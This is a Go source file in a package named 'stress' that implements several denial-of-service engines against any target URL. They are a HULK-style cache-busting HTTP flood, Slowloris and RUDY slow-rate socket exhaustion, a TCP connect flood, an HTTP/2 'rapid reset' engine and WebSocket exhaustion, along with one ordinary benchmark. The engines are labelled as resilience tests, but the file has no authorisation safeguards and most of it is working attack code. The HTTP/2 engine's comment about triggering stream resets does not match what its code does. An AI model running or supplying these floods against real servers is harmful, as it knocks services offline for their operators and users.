package stress

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like a Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
}

func randomString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// ==========================================
// 1. TRUE HTTP-LAYER HULK ENGINE
// ==========================================
func ExecuteContinuousStress(targetURL string, concurrency int, durationSec int) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	fmt.Printf("[!] ENGAGING TRUE HTTP-LAYER HULK ENGINE: %s (Concurrency: %d)\n", targetURL, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        concurrency * 2,
		MaxIdleConnsPerHost: concurrency,
		IdleConnTimeout:     30 * time.Second,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	taskStream := make(chan struct{}, concurrency)

	for i := 0; i < concurrency; i++ {
		go func() {
			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
			for range taskStream {
				cacheBuster := fmt.Sprintf("?%s=%s", randomString(6), randomString(8))
				reqURL := targetURL + cacheBuster

				req, err := http.NewRequest("GET", reqURL, nil)
				if err != nil {
					continue
				}

				req.Header.Set("User-Agent", userAgents[rng.Intn(len(userAgents))])
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("Pragma", "no-cache")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}()
	}

	go func() {
		for {
			taskStream <- struct{}{}
		}
	}()

	handleDuration(durationSec, sigChan, "HTTP resilience test")
}

// ==========================================
// 2. SLOWLORIS SLOW-RATE EXHAUSTION ENGINE
// ==========================================
func ExecuteSlowRateStress(targetURL string, concurrency int, durationSec int) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	parsedTarget, port, isTLS := parseTargetDetails(targetURL)
	fmt.Printf("[!] ENGAGING SLOW-RATE EXHAUSTION (SLOWLORIS): %s:%s (Sockets: %d)\n", parsedTarget, port, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	for i := 0; i < concurrency; i++ {
		go func() {
			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
			for {
				conn, err := dialTarget(parsedTarget, port, isTLS)
				if err != nil {
					time.Sleep(2 * time.Second)
					continue
				}

				ua := userAgents[rng.Intn(len(userAgents))]
				initialReq := fmt.Sprintf("GET /?%s=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept-language: en-US,en,q=0.5\r\n", 
					randomString(4), randomString(6), parsedTarget, ua)
				
				_, err = conn.Write([]byte(initialReq))
				if err != nil {
					conn.Close()
					continue
				}

				for {
					time.Sleep(10 * time.Second)
					_, err = conn.Write([]byte(fmt.Sprintf("X-%s: %s\r\n", randomString(4), randomString(4))))
					if err != nil {
						conn.Close()
						break
					}
				}
			}
		}()
	}

	handleDuration(durationSec, sigChan, "Slow-rate exhaustion test")
}

// ==========================================
// 3. LAYER 4 TRANSPORT & SYN STATE FLOOD ENGINE
// ==========================================
func ExecuteTransportSynFlood(targetAddr string, concurrency int, durationSec int) {
	fmt.Printf("[!] ENGAGING LAYER 4 TRANSPORT STATE/SYN FLOOD: %s (Concurrency: %d)\n", targetAddr, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	taskStream := make(chan struct{}, concurrency)

	for i := 0; i < concurrency; i++ {
		go func() {
			dialer := &net.Dialer{Timeout: 1 * time.Second}
			for range taskStream {
				conn, err := dialer.Dial("tcp", targetAddr)
				if err == nil {
					_ = conn.SetDeadline(time.Now().Add(500 * time.Millisecond))
					conn.Close()
				}
			}
		}()
	}

	go func() {
		for {
			taskStream <- struct{}{}
		}
	}()

	handleDuration(durationSec, sigChan, "Transport layer state flood")
}

// ==========================================
// 4. WRK-STYLE HIGH-PERFORMANCE BENCHMARKING ENGINE
// ==========================================
func ExecuteWrkBenchmark(targetURL string, concurrency int, durationSec int) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	if durationSec <= 0 {
		durationSec = 10
	}

	fmt.Printf("[!] ENGAGING WRK-STYLE BENCHMARKING ENGINE: %s (Concurrency: %d, Window: %ds)\n", targetURL, concurrency, durationSec)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	var successCount uint64
	var failCount uint64

	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        concurrency * 2,
		MaxIdleConnsPerHost: concurrency,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   4 * time.Second,
	}

	stopChan := make(chan struct{})
	startTime := time.Now()

	for i := 0; i < concurrency; i++ {
		go func() {
			for {
				select {
				case <-stopChan:
					return
				default:
					resp, err := client.Get(targetURL)
					if err != nil {
						atomic.AddUint64(&failCount, 1)
					} else {
						atomic.AddUint64(&successCount, 1)
						resp.Body.Close()
					}
				}
			}
		}()
	}

	ticker := time.NewTicker(1 * time.Second)
	timer := time.NewTimer(time.Duration(durationSec) * time.Second)

	done := false
	for !done {
		select {
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			currentSuccess := atomic.LoadUint64(&successCount)
			currentFail := atomic.LoadUint64(&failCount)
			rps := float64(currentSuccess+currentFail) / elapsed
			fmt.Printf("[BENCHMARK] Elapsed: %.0fs | Requests: %d | Errors: %d | Throughput: %.2f req/sec\n", 
				elapsed, currentSuccess+currentFail, currentFail, rps)
		case <-timer.C:
			close(stopChan)
			done = true
		case <-sigChan:
			close(stopChan)
			fmt.Println("\n[+] Benchmark aborted by operator.")
			return
		}
	}

	elapsedTotal := time.Since(startTime).Seconds()
	finalSuccess := atomic.LoadUint64(&successCount)
	finalFail := atomic.LoadUint64(&failCount)
	totalReqs := finalSuccess + finalFail

	fmt.Println("\n==============================================")
	fmt.Println("          BENCHMARK RESULTS SUMMARY           ")
	fmt.Println("==============================================")
	fmt.Printf(" • Total Duration:    %.2f seconds\n", elapsedTotal)
	fmt.Printf(" • Successful Requests: %d\n", finalSuccess)
	fmt.Printf(" • Failed Requests:     %d\n", finalFail)
	fmt.Printf(" • Average RPS:       %.2f requests/sec\n", float64(totalReqs)/elapsedTotal)
	fmt.Println("==============================================")
}

// ==========================================
// 5. RUDY SLOW-POST EXHAUSTION ENGINE
// ==========================================
func ExecuteRudyStress(targetURL string, concurrency int, durationSec int) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	parsedTarget, port, isTLS := parseTargetDetails(targetURL)
	fmt.Printf("[!] ENGAGING RUDY SLOW-POST EXHAUSTION ENGINE: %s:%s (Sockets: %d)\n", parsedTarget, port, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	for i := 0; i < concurrency; i++ {
		go func() {
			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
			for {
				conn, err := dialTarget(parsedTarget, port, isTLS)
				if err != nil {
					time.Sleep(2 * time.Second)
					continue
				}

				ua := userAgents[rng.Intn(len(userAgents))]
				postHeader := fmt.Sprintf("POST /?%s=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1000000\r\nConnection: keep-alive\r\n\r\n",
					randomString(4), randomString(5), parsedTarget, ua)

				_, err = conn.Write([]byte(postHeader))
				if err != nil {
					conn.Close()
					continue
				}

				// Slow drip POST body bytes one by one every 5 seconds to lock worker threads
				for {
					time.Sleep(5 * time.Second)
					_, err = conn.Write([]byte("A"))
					if err != nil {
						conn.Close()
						break
					}
				}
			}
		}()
	}

	handleDuration(durationSec, sigChan, "RUDY slow-post exhaustion test")
}

// ==========================================
// 6. HTTP/2 RAPID RESET & STREAM MULTIPLEXING
// ==========================================
func ExecuteH2RapidResetStress(targetURL string, concurrency int, durationSec int) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	fmt.Printf("[!] ENGAGING HTTP/2 RAPID RESET & STREAM ENGINE: %s (Concurrency: %d)\n", targetURL, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		ForceAttemptHTTP2:   true,
		MaxIdleConns:        concurrency * 2,
		MaxIdleConnsPerHost: concurrency,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   3 * time.Second,
	}

	taskStream := make(chan struct{}, concurrency)

	for i := 0; i < concurrency; i++ {
		go func() {
			for range taskStream {
				req, err := http.NewRequest("GET", targetURL, nil)
				if err != nil {
					continue
				}
				req.Header.Set("Connection", "keep-alive")

				// Perform request and instantly trigger teardown/cancellation to mimic RST_STREAM churn
				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}()
	}

	go func() {
		for {
			taskStream <- struct{}{}
		}
	}()

	handleDuration(durationSec, sigChan, "HTTP/2 rapid reset stress test")
}

// ==========================================
// 7. WEBSOCKET CONNECTION & FRAME EXHAUSTION
// ==========================================
func ExecuteWebSocketStress(targetURL string, concurrency int, durationSec int) {
	if strings.HasPrefix(targetURL, "http://") {
		targetURL = "ws://" + strings.TrimPrefix(targetURL, "http://")
	} else if strings.HasPrefix(targetURL, "https://") {
		targetURL = "wss://" + strings.TrimPrefix(targetURL, "https://")
	}
	if !strings.HasPrefix(targetURL, "ws://") && !strings.HasPrefix(targetURL, "wss://") {
		targetURL = "ws://" + targetURL
	}

	parsedTarget, port, isTLS := parseTargetDetails(strings.Replace(strings.Replace(targetURL, "ws://", "http://", 1), "wss://", "https://", 1))

	fmt.Printf("[!] ENGAGING WEBSOCKET POOL & FRAME EXHAUSTION: %s:%s (Sockets: %d)\n", parsedTarget, port, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	for i := 0; i < concurrency; i++ {
		go func() {
			for {
				conn, err := dialTarget(parsedTarget, port, isTLS)
				if err != nil {
					time.Sleep(2 * time.Second)
					continue
				}

				// Generate Sec-WebSocket-Key for handshake
				keyBytes := make([]byte, 16)
				rand.Read(keyBytes)
				wsKey := base64.StdEncoding.EncodeToString(keyBytes)

				upgradeReq := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n",
					parsedTarget, wsKey)

				_, err = conn.Write([]byte(upgradeReq))
				if err != nil {
					conn.Close()
					continue
				}

				// Keep socket open and flood periodic ping/text data frames
				for {
					time.Sleep(8 * time.Second)
					// Standard WebSocket ping frame opcode 0x9
					_, err = conn.Write([]byte{0x89, 0x00})
					if err != nil {
						conn.Close()
						break
					}
				}
			}
		}()
	}

	handleDuration(durationSec, sigChan, "WebSocket exhaustion test")
}

// ==========================================
// HELPER UTILITIES
// ==========================================
func parseTargetDetails(targetURL string) (string, string, bool) {
	parsedTarget := strings.TrimPrefix(targetURL, "http://")
	parsedTarget = strings.TrimPrefix(parsedTarget, "https://")
	isTLS := strings.HasPrefix(targetURL, "https://")

	port := "80"
	if isTLS {
		port = "443"
	}
	if strings.Contains(parsedTarget, ":") {
		parts := strings.Split(parsedTarget, ":")
		parsedTarget = parts[0]
		port = parts[1]
	}
	return parsedTarget, port, isTLS
}

func dialTarget(parsedTarget, port string, isTLS bool) (net.Conn, error) {
	address := fmt.Sprintf("%s:%s", parsedTarget, port)
	if isTLS {
		return tls.DialWithDialer(&net.Dialer{Timeout: 3 * time.Second}, "tcp", address, &tls.Config{InsecureSkipVerify: true})
	}
	return net.DialTimeout("tcp", address, 3*time.Second)
}

func handleDuration(durationSec int, sigChan chan os.Signal, testName string) {
	if durationSec > 0 {
		timer := time.NewTimer(time.Duration(durationSec) * time.Second)
		select {
		case <-timer.C:
			fmt.Printf("\n[+] %s duration completed.\n", testName)
		case <-sigChan:
			fmt.Printf("\n[+] %s aborted by operator.\n", testName)
		}
	} else {
		<-sigChan
		fmt.Printf("\n[+] %s terminated by operator.\n", testName)
	}
}
